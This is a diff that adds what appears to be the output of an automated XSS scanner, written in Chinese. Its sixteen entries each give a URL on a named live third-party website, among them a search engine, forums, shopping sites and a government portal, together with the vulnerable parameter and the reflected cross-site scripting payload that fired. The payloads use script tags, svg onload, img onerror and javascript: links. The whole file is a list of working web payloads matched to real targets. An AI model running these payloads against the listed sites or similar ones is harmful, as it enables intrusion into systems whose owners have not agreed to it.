@@ -1,0 +1,64 @@
+﻿检测网址 : https://ss.knet.cn/verifyseal.dll?comefrom=verify&trustValue=www.tianya.cn&trustKey=%22%3E%3Cp%2Fid%3D1%250Aonmousemove%250A%3D%250Aconfirm%601%60%3Ehoveme&sn=e13062611010041408duli000000
+漏洞参数 : trustKey
+攻击载荷 : "><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme
+------------------
+检测网址 : http://www.jinianbi.com//search.asp?keyword=%e9%b8%a1%e5%b9%b4%e7%94%9f%e8%82%96%e7%ba%aa%e5%bf%b5%e5%b8%81
+漏洞参数 : keyword
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------
+检测网址 : http://www.baidu.com/s?wd=www.anyv.net
+漏洞参数 : wd
+攻击载荷 : "><img src=x onerror=prompt(1)>
+------------------
+检测网址 : http://biz.rfidworld.com.cn/?nType=3
+漏洞参数 : nType
+攻击载荷 : "><svg/onload=prompt(1)>
+------------------
+检测网址 : http://biz.rfidworld.com.cn/?nType=%22%3E%3Csvg%2Fonload%3Dprompt%281%29%3E
+漏洞参数 : nType
+攻击载荷 : "><svg/onload=prompt(1)>
+------------------
+检测网址 : http://www.syztfj.com/newshow.asp?id=950
+漏洞参数 : id
+攻击载荷 : "><a href="javascript:confirm%28 1%29">Clickme</a>
+------------------
+检测网址 : http://www.syztfj.com/newshow.asp?id=%22%3E%3Ca+href%3D%22javascript%3Aconfirm%2528+1%2529%22%3EClickme%3C%2Fa%3E
+漏洞参数 : id
+攻击载荷 : "><a href="javascript:confirm%28 1%29">Clickme</a>
+------------------
+检测网址 : http://bbs.kjj.com/plugin.php?id=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%281%29%3E
+漏洞参数 : id
+攻击载荷 : "><img src=x onerror=prompt(1)>
+------------------
+检测网址 : http://www.yishionteebox.com/?route=privacy  【获取失败】
+漏洞参数 : route
+攻击载荷 : "><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme
+------------------
+检测网址 : http://www.360yao.com/search?keyword=%25E5%2581%25A5%25E6%25B0%2591
+漏洞参数 : keyword
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------
+检测网址 : https://z2.jschina.com.cn/zfrx/zf_xieyi.jsp?mType=13
+漏洞参数 : mType
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------
+检测网址 : https://z2.jschina.com.cn/zfrx/zf_xieyi.jsp?mType=%3C%2Fscript%3E%22%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E
+漏洞参数 : mType
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------
+检测网址 : http://www.5151sc.com/searchs.php?kw=%B8%A3%D7%D6%BA%D8%CB%EA%D2%F8%B1%D2&page=0  【获取失败】
+漏洞参数 : kw
+攻击载荷 : "><img/src=x%0Aonerror=prompt`1`>
+------------------
+检测网址 : http://www.cz365.com//code/files/post/?cls=15【获取失败】
+漏洞参数 : cls
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------
+检测网址 : http://www.falongfa.com/search.php?typeid=68&huxing=&mianji=
+漏洞参数 : typeid
+攻击载荷 : "><svg/onload=prompt(1)>
+------------------
+检测网址 : http://www.21ic.com.cn//searchProduct?c1=15&brand=%BE%B0%C8%FC
+漏洞参数 : brand
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------
